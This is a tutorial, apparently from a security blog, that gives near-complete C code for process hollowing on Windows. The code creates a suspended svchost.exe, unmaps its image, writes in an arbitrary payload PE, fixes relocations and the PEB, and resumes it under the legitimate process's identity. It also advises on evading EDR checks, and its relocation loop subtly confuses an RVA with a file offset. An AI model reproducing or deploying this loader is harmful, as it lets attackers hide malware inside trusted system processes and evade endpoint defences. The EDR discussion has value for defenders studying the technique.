---
layout: page
title: "Process Hollowing: Replacing a Legitimate Process"
---

# Process Hollowing: Replacing a Legitimate Process

Process injection writes code into a process that is already running. Process hollowing goes further: it creates a legitimate process, removes its code before it executes a single instruction, replaces it with a payload, and lets the OS resume execution. From the outside, a legitimate binary started and ran. The process name, path, parent, and image on disk are all genuine. The code executing inside it is not.

The technique has a specific window of opportunity: between process creation and the moment the main thread's entry point executes. Inside that window, the process exists but is frozen. The original code can be removed and replaced before it is ever seen.

## The Suspended State

`CreateProcess` accepts a `dwCreationFlags` parameter. Passing `CREATE_SUSPENDED` creates the process and its main thread, but halts the thread before it begins executing. The process object exists, it has a PEB, a stack, and a mapped image. The thread object exists with its initial context set and its instruction pointer positioned at the entry point. Nothing has run.

```c
#include <windows.h>

PROCESS_INFORMATION pi = {0};
STARTUPINFOA si        = { .cb = sizeof(si) };

BOOL ok = CreateProcessA(
    "C:\\Windows\\System32\\svchost.exe",
    NULL,
    NULL, NULL,
    FALSE,
    CREATE_SUSPENDED,
    NULL, NULL,
    &si, &pi
);
```

`pi.hProcess` is a handle to the new process. `pi.hThread` is a handle to its main thread, suspended. The process is real and visible in Task Manager. The thread will not run until something calls `ResumeThread`.

## Reading the Thread Context

The thread's initial context contains the CPU register state at the point of suspension. On x64, `RCX` holds the entry point address. On x86, `EAX` holds it. More importantly, the context gives access to `Rdx` (x64) or `Ebx` (x86), which points to the Process Environment Block.

```c
#ifdef _WIN64
#define CONTEXT_ARCH CONTEXT_AMD64
#else
#define CONTEXT_ARCH CONTEXT_X86
#endif

CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// x64: RDX points to PEB
// x86: EBX points to PEB
#ifdef _WIN64
LPVOID peb_addr = (LPVOID)ctx.Rdx;
#else
LPVOID peb_addr = (LPVOID)ctx.Ebx;
#endif
```

The PEB is in the target process's address space. Reading it requires `ReadProcessMemory`. The field of interest is `ImageBaseAddress`, at offset 0x10 (x64) or 0x08 (x86):

```c
LPVOID image_base = NULL;

ReadProcessMemory(
    pi.hProcess,
    (LPVOID)((ULONG_PTR)peb_addr + 0x10),  // ImageBaseAddress offset (x64)
    &image_base,
    sizeof(LPVOID),
    NULL
);
```

`image_base` now holds the address where `svchost.exe`'s image is mapped in the target process.

## Unmapping the Original Image

The original executable is mapped into the process memory from its file on disk. The mapping must be removed before the payload can be written. `NtUnmapViewOfSection` does this. It is not exported from a commonly used Win32 DLL, so it must be resolved from NTDLL directly.

```c
typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);

NtUnmapViewOfSection_t NtUnmap =
    (NtUnmapViewOfSection_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtUnmapViewOfSection"
    );

NtUnmap(pi.hProcess, image_base);
```

After this call, the memory region that held `svchost.exe`'s code and headers is gone. The process's main thread is still suspended. The PEB still records the old image base address. The process is in an inconsistent state until the payload is written and the PEB is updated.

## Writing the Payload

The payload must be a valid PE file. Process hollowing requires a full PE: DOS header, NT headers, section headers, and sections. The loader needs to map it correctly into the target's address space.

Read the payload from disk or from memory, then parse its NT headers to extract the preferred base address and total image size:

```c
// payload_buf: raw PE bytes read into local memory
// payload_len: size of the buffer

PIMAGE_DOS_HEADER dos =
    (PIMAGE_DOS_HEADER)payload_buf;

PIMAGE_NT_HEADERS nt =
    (PIMAGE_NT_HEADERS)(payload_buf + dos->e_lfanew);

LPVOID preferred_base =
    (LPVOID)nt->OptionalHeader.ImageBase;

SIZE_T image_size =
    nt->OptionalHeader.SizeOfImage;
```

Allocate memory in the target at the payload's preferred base address. Requesting the exact preferred address is not guaranteed, but most PE files are compiled with a base that is unlikely to be occupied by other mappings in a freshly created process:

```c
LPVOID remote_image = VirtualAllocEx(
    pi.hProcess,
    preferred_base,
    image_size,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

If the allocation succeeds at `preferred_base`, no relocation is needed. If the OS places it elsewhere, the payload's relocations must be applied.

Write the PE headers first:

```c
WriteProcessMemory(
    pi.hProcess,
    remote_image,
    payload_buf,
    nt->OptionalHeader.SizeOfHeaders,
    NULL
);
```

Then write each section individually. The section header specifies the file offset (`PointerToRawData`) and the virtual offset within the image (`VirtualAddress`):

```c
PIMAGE_SECTION_HEADER section =
    IMAGE_FIRST_SECTION(nt);

for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    WriteProcessMemory(
        pi.hProcess,
        (LPVOID)((ULONG_PTR)remote_image + section[i].VirtualAddress),
        payload_buf + section[i].PointerToRawData,
        section[i].SizeOfRawData,
        NULL
    );
}
```

## Applying Relocations

If `remote_image` differs from `preferred_base`, every absolute address in the payload is wrong by the difference. The relocation table lists every location that must be patched.

```c
ULONG_PTR delta = (ULONG_PTR)remote_image - nt->OptionalHeader.ImageBase;

if (delta != 0) {
    PIMAGE_DATA_DIRECTORY reloc_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)(payload_buf + reloc_dir->VirtualAddress);

    while (reloc->VirtualAddress) {
        DWORD  count   = (reloc->SizeOfBlock - sizeof(*reloc)) / sizeof(WORD);
        PWORD  entries = (PWORD)((ULONG_PTR)reloc + sizeof(*reloc));

        for (DWORD j = 0; j < count; j++) {
            WORD type   = entries[j] >> 12;
            WORD offset = entries[j] & 0x0FFF;

            if (type == IMAGE_REL_BASED_DIR64) {      // x64
                ULONG_PTR *patch_addr =
                    (ULONG_PTR *)(payload_buf
                                  + reloc->VirtualAddress
                                  + offset);
                *patch_addr += delta;

                // Write the patched value into the remote process
                WriteProcessMemory(
                    pi.hProcess,
                    (LPVOID)((ULONG_PTR)remote_image
                             + reloc->VirtualAddress + offset),
                    patch_addr,
                    sizeof(ULONG_PTR),
                    NULL
                );
            }
        }

        reloc = (PIMAGE_BASE_RELOCATION)(
            (ULONG_PTR)reloc + reloc->SizeOfBlock
        );
    }
}
```

Each relocation entry specifies a type and an offset within a 4KB page. `IMAGE_REL_BASED_DIR64` is the only type that matters on x64. The patch reads the current value at that address, adds the delta, and writes the corrected value back.

## Updating the PEB

The PEB's `ImageBaseAddress` field still holds the original executable's base. Some EDRs and integrity checks compare the PEB's recorded base against what is actually mapped. If they differ, it is a signal. Update the PEB to reflect the new image base:

```c
WriteProcessMemory(
    pi.hProcess,
    (LPVOID)((ULONG_PTR)peb_addr + 0x10),
    &remote_image,
    sizeof(LPVOID),
    NULL
);
```

## Redirecting Execution and Resuming

The main thread's instruction pointer points to the original entry point, which no longer exists. Set it to the payload's entry point before resuming. The entry point is the image base plus the `AddressOfEntryPoint` from the optional header:

```c
LPVOID entry_point =
    (LPVOID)((ULONG_PTR)remote_image
             + nt->OptionalHeader.AddressOfEntryPoint);

#ifdef _WIN64
ctx.Rcx = (DWORD64)entry_point;
#else
ctx.Eax = (DWORD)entry_point;
#endif

SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

`ResumeThread` decrements the thread's suspend count. When it reaches zero, the thread begins executing. The first instruction it runs belongs to the payload.

## What the EDR Sees

The detection surface differs from classic injection in important ways.

No `OpenProcess` call to an existing process occurs. The process was created by your binary, so the handle relationship is expected: a parent process holding a handle to a child it created. That relationship is normal for legitimate software.

`NtUnmapViewOfSection` is the loudest signal. The function is rarely called in normal software. Its appearance in an API trace, applied to the main image of a freshly spawned process, is a near-certain indicator of hollowing. EDRs hook it and alert on any call that targets an image mapping rather than a file-backed view.

The sequence `VirtualAllocEx` at a specific base address, followed by `WriteProcessMemory` with a byte count equal to the size of a PE image, followed by `SetThreadContext` modifying the instruction pointer, followed by `ResumeThread` is recognizable as hollowing even without catching `NtUnmapViewOfSection` directly.

The PEB's `ImageBaseAddress` mismatch, if not corrected, is a passive indicator that post-execution memory scanners detect. A running process whose PEB-recorded image base does not match any module in its module list is flagged.

## The Memory Scan Problem

After the payload resumes and runs, it is mapped as a committed, executable region with no backing module. The Windows loader maintains a list of loaded modules accessible through the PEB's `Ldr` structure. Your payload is not in that list. A memory scan comparing committed executable regions against the module list finds the discrepancy.

Reflective loading addresses this: the payload registers itself in the PEB module list, making it appear as a legitimate loaded module. That is a different technique with its own mechanics.

The hollowing step establishes process identity and bypasses the creation-time detection that injection triggers. What the payload does inside that process, and whether its in-memory footprint survives post-execution scanning, are separate problems.
